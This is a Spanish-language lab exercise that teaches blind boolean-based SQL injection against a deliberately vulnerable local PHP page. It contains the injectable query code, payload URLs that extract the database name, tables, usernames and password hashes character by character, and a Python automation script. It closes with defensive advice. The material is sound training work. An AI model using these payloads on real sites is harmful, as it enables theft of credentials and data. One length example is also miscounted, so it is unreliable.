# Ejercicio 5: Demostración Manual de Blind SQL Injection

## 🎯 Objetivo
Demostrar cómo explotar Blind SQL Injection de forma manual cuando la aplicación no muestra datos específicos, solo confirmación de existencia.

## 🔍 Análisis de la Vulnerabilidad Blind

### Código Vulnerable Actual:
```php
// En news.php línea ~18
$query = "SELECT id FROM blog WHERE id = " . $id;
$result = $pdo->query($query);

// BLIND: Solo confirmamos si existe al menos un resultado
if ($result && $result->rowCount() > 0) {
    $article_exists = true;
} else {
    $article_exists = false;
}
```

### Características del Blind SQLi:
- ✅ **Vulnerabilidad presente:** Concatenación directa sin escape
- ❌ **No muestra datos:** Solo respuesta booleana (existe/no existe)
- ❌ **No muestra errores SQL:** Errores genéricos solamente
- 🔍 **Extracción por inferencia:** Requiere técnicas especiales

## 🧪 Técnicas de Explotación Blind SQLi

### 1. Verificación de Vulnerabilidad
**URL:** `http://localhost/news.php?id=1`
**Resultado:** ✅ "Artículo Encontrado"

**URL:** `http://localhost/news.php?id=999`
**Resultado:** ❌ "Artículo No Encontrado"

**Confirmación:** La aplicación responde de forma diferente según la consulta.

---

### 2. Prueba Básica de Inyección Boolean-Based
**URL:** `http://localhost/news.php?id=1%20AND%201=1`
**URL sin codificar:** `http://localhost/news.php?id=1 AND 1=1`

**SQL Generada:**
```sql
SELECT id FROM blog WHERE id = 1 AND 1=1
```
**Resultado esperado:** ✅ "Artículo Encontrado" (1=1 siempre es verdadero)

---

**URL:** `http://localhost/news.php?id=1%20AND%201=2`
**URL sin codificar:** `http://localhost/news.php?id=1 AND 1=2`

**SQL Generada:**
```sql
SELECT id FROM blog WHERE id = 1 AND 1=2
```
**Resultado esperado:** ❌ "Artículo No Encontrado" (1=2 siempre es falso)

**✅ Confirmación de Blind SQLi:** Respuestas diferentes confirman la vulnerabilidad.

---

### 3. Extracción del Nombre de la Base de Datos

#### Determinar longitud del nombre de la base de datos:
**URL:** `http://localhost/news.php?id=1%20AND%20LENGTH(database())=1`
**Resultado esperado:** ❌ "No Encontrado"

**URL:** `http://localhost/news.php?id=1%20AND%20LENGTH(database())=15`
**SQL:** `SELECT id FROM blog WHERE id = 1 AND LENGTH(database())=15`
**Resultado esperado:** ✅ "Encontrado" (si 'auditoria_web' tiene 15 caracteres)

#### Extraer caracteres uno por uno:
**URL:** `http://localhost/news.php?id=1%20AND%20SUBSTRING(database(),1,1)='a'`
**SQL:** `SELECT id FROM blog WHERE id = 1 AND SUBSTRING(database(),1,1)='a'`
**Resultado esperado:** ✅ "Encontrado" (primer carácter es 'a')

**URL:** `http://localhost/news.php?id=1%20AND%20SUBSTRING(database(),2,1)='u'`
**SQL:** `SELECT id FROM blog WHERE id = 1 AND SUBSTRING(database(),2,1)='u'`
**Resultado esperado:** ✅ "Encontrado" (segundo carácter es 'u')

---

### 4. Extracción de Información de Tablas

#### Contar número de tablas:
**URL:** `http://localhost/news.php?id=1%20AND%20(SELECT%20COUNT(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema=database())=2`

**SQL Generada:**
```sql
SELECT id FROM blog WHERE id = 1 AND 
(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())=2
```
**Resultado esperado:** ✅ "Encontrado" (tenemos 2 tablas: blog y users)

#### Extraer nombres de tablas carácter por carácter:
**URL:** `http://localhost/news.php?id=1%20AND%20SUBSTRING((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%201),1,1)='b'`

**SQL Generada:**
```sql
SELECT id FROM blog WHERE id = 1 AND 
SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1)='b'
```
**Resultado esperado:** ✅ "Encontrado" (primera tabla empieza con 'b' - 'blog')

---

### 5. Extracción de Datos de la Tabla Users

#### Contar registros en tabla users:
**URL:** `http://localhost/news.php?id=1%20AND%20(SELECT%20COUNT(*)%20FROM%20users)=3`
**Resultado esperado:** ✅ "Encontrado" (hay 3 usuarios)

#### Extraer username del primer usuario:
**URL:** `http://localhost/news.php?id=1%20AND%20SUBSTRING((SELECT%20username%20FROM%20users%20LIMIT%201),1,1)='a'`

**SQL Generada:**
```sql
SELECT id FROM blog WHERE id = 1 AND 
SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'
```
**Resultado esperado:** ✅ "Encontrado" (si el primer usuario es 'admin')

#### Extraer password hash del primer usuario:
**URL:** `http://localhost/news.php?id=1%20AND%20SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20username='admin'),1,1)='5'`

**Proceso:** Repetir para cada carácter hasta extraer el hash completo.

---

## 🔧 Automatización con Script

### Script Python para Automatizar Extracción:
```python
import requests
import string

def blind_sqli_extract(base_url, query_template):
    result = ""
    position = 1
    
    while True:
        found_char = False
        
        # Probar cada carácter posible
        for char in string.ascii_letters + string.digits + '_':
            payload = query_template.format(position=position, char=char)
            url = f"{base_url}?id={payload}"
            
            response = requests.get(url)
            
            # Si encuentra el carácter (página contiene "Encontrado")
            if "Artículo Encontrado" in response.text:
                result += char
                found_char = True
                print(f"Posición {position}: {char} -> {result}")
                break
        
        if not found_char:
            break
            
        position += 1
    
    return result

# Ejemplo de uso
base_url = "http://localhost/news.php"
db_name_query = "1 AND SUBSTRING(database(),{position},1)='{char}'"

print("Extrayendo nombre de base de datos...")
database_name = blind_sqli_extract(base_url, db_name_query)
print(f"Base de datos: {database_name}")
```

---

## 📊 Comparación: SQLi Clásico vs Blind SQLi

| Aspecto | SQLi Clásico (Ejercicio 3) | Blind SQLi (Ejercicio 5) |
|---------|----------------------------|---------------------------|
| **Datos mostrados** | ✅ Todos los datos | ❌ Solo existe/no existe |
| **Errores SQL** | ✅ Errores visibles | ❌ Errores ocultos |
| **Velocidad extracción** | ⚡ Inmediata | 🐌 Carácter por carácter |
| **Detección** | 🔍 Fácil de detectar | 🕵️ Más difícil de detectar |
| **Automatización** | ✅ Simple | 🔧 Requiere scripts |

---

## 🎯 Objetivos de Aprendizaje Alcanzados

- [x] Comprender las diferencias entre SQLi clásico y Blind SQLi
- [x] Identificar técnicas Boolean-based para Blind SQLi
- [x] Extraer información carácter por carácter
- [x] Enumerar base de datos, tablas y datos sin ver resultados directos
- [x] Automatizar el proceso de extracción con scripts

---

## 🚀 Próximo Ejercicio

**Ejercicio 6:** Uso de herramientas automatizadas (SQLMap) para auditoría de ambas vulnerabilidades y comparación de resultados.

---

## 📝 Notas de Seguridad

⚠️ **Este ejercicio demuestra vulnerabilidades reales para fines educativos. En un entorno de producción:**

1. **Nunca** concatenar directamente parámetros de usuario en consultas SQL
2. **Usar** prepared statements con parámetros vinculados
3. **Implementar** validación y sanitización de inputs
4. **Aplicar** principio de menor privilegio en bases de datos
5. **Monitorear** consultas SQL anómalas en logs de seguridad
